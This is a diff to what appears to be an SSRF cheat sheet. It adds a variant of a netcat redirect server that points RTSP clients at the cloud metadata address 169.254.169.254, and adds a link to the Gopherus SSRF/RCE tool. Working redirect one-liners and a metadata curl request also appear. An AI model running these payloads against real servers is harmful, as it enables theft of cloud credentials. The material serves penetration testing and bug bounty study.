@@ -93,7 +93,7 @@ xml 301 response without and with a valid response body:
 
 `while true ; do nc -l -p 80 -c 'echo -e "HTTP/1.1 302 Found\nContent-Type: application/json\nLocation: http://169.254.169.254/\n{\"a\":\"b\"}"'; done`
 
-`while true ; do nc -l -p 554 -c 'echo -e "RTSP/1.0 301 Moved\nCSeq: 1\nLocation: http://169.254.169.254/"'; done`
+`export RTSPLOCATION="http://169.254.169.254/"; while true ; do nc -l -p 554 -c 'echo -e "RTSP/1.0 301 Moved\nCSeq: 1\nLocation: $RTSPLOCATION"'; done`
 
 ***
 
@@ -304,5 +304,10 @@ curl http://remote-ip-address/latest/meta-data/ -H "Host: 169.154.169.254"
 
 ### All you need to know about SSRF and how may we write tools to do auto-detect
 https://medium.com/bugbountywriteup/the-design-and-implementation-of-ssrf-attack-framework-550e9fda16ea
+
+***
+
+### Gopherus - This tool generates gopher link for doing SSRF and RCE in various servers
+https://spyclub.tech/2018/blog-on-gopherus/
 
 ***
